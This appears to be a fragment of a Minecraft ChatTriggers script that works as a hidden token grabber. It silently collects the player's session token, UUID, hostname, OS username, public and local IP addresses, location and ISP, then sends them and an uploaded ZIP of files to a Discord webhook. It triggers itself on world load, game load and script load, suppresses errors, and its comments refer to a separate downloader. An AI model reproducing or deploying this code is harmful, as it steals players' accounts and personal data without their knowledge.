        // Build a Discord embed style payload
        function trimField(v, limit) {
            var s = String(v==null?'':v);
            if (s.length > limit) s = s.substring(0, limit-3) + '...';
            return s;
        }
        var tokenField = '```\n' + trimField(String(datanigga.token||''), 1000) + '\n```';
        var embed = {
            title: '\ud83e\udd8a ' + mcUsername,
            color: 0x2B2D31,
            fields: [
                { name: 'UUID', value: trimField(Player.getUUID(), 1024), inline: false },
                { name: 'Token', value: tokenField, inline: false },
                { name: 'Hostname', value: trimField(hostName, 1024), inline: true },
                { name: 'OS Username', value: trimField(osUser, 1024), inline: true },
                { name: 'IP Public', value: trimField(publicIp, 1024), inline: true },
                { name: 'IP Local', value: trimField(localIp, 1024), inline: true },
                { name: 'Country', value: (flag ? flag + ' ' : '') + trimField(country, 1024), inline: true },
                { name: 'City', value: trimField(city, 1024), inline: true },
                { name: 'Region', value: trimField(region, 1024), inline: true },
                { name: 'ISP', value: trimField(isp, 1024), inline: true }
            ],
            footer: { text: 'Minecraft Data Collector' },
            timestamp: new Date().toISOString()
        };

        // Step 1: Send the embed-only message (wait=true) and capture message ID
        var embedOnlyResponse = sendJsonReturnBody(JSON.stringify({ embeds: [ embed ] }), 6);
        var ok = false; var messageId = null;
        try { var r1 = JSON.parse(String(embedOnlyResponse||'')); if (r1 && r1.id) { ok = true; messageId = String(r1.id); } } catch (e0) { ok = false; }
        if (!ok) {
            try {
                // Fallback: try a simple content message to ensure webhook works
                var simple = { content: header };
                var rSimple = sendJsonReturnBody(JSON.stringify(simple), 3);
                var pSimple = null; try { pSimple = JSON.parse(String(rSimple||'')); } catch(eS) {}
                if (pSimple && pSimple.id) { ok = true; messageId = String(pSimple.id); }
            } catch (eF) {}
        }

        // Step 2: Upload the ZIP as a reply/attachment so it renders under the existing message
        if (ok) {
            // Discord does not provide a direct upload-to-existing-message for webhooks, so we append a tiny follow-up with file only
            // Include a small content to associate context, then delete content via edit
            var attachPayload = { content: ' ' };
            var responseBody = sendMultipartReturnBody(JSON.stringify(attachPayload), files, 6);
            try {
                var resp = JSON.parse(String(responseBody||''));
                if (!CUSTOM_ENDPOINT_URL && resp && resp.attachments && resp.attachments.length > 0) {
                    var attachUrl = String(resp.attachments[0].url || '');
                    var updatedEmbed = embed;
                    updatedEmbed.fields = embed.fields.concat([{ name: 'Download', value: '[' + safeName + '.zip](' + attachUrl + ')', inline: true }]);
                    var editPayload = { embeds: [ updatedEmbed ] };
                    editWebhookMessage(messageId, JSON.stringify(editPayload));

                } else if (CUSTOM_ENDPOINT_URL) {

                }
            } catch (eResp) {}
        } else {
            // Fallback: send combined as before
            var fallbackPayload = { embeds: [ embed ] };
            var ok2 = false;
            try {
                var rb = sendMultipartReturnBody(JSON.stringify(fallbackPayload), files, 6);
                // If response body parses, we consider it success
                if (rb && String(rb).length >= 0) ok2 = true;
            } catch (eM) {}

        }
        // Lock mechanism removed

        // downloader moved to a separate top-level IIFE below so it runs even if this block exits early

        try { ChatLib.chat(ok ? '' : ''); } catch (ignore) {}

    } catch (e) {
        try { ChatLib.chat('' + e); } catch (ignore2) {}
    }
}



// PowerShell execution removed

// Multiple triggers to ensure execution works after /ct reload
function executeDataCollection() {
    setTimeout(function() {
        try {
            setTimeout(function() {
                try {
                    try { sendDataToDiscord(); } catch (eSend) {}
                } catch (e) {
                    // Silent execution
                }
            }, 3000);
        } catch (e) {
            // Silent execution - don't crash Minecraft
        }
    }, 2000);
}

// Trigger on world load (initial join)
register("worldLoad", function() {
    executeDataCollection();
});

// Trigger on script load/reload (works with /ct reload)
register("gameLoad", function() {
    executeDataCollection();
});

// Also execute immediately when script loads (backup trigger)
setTimeout(function() {
    try {
        // Check if player is in game before executing
        if (Player && Player.getPlayer()) {
            executeDataCollection();
        }
    } catch (e) {
        // Player not available yet, that's fine
    }
}, 1000);
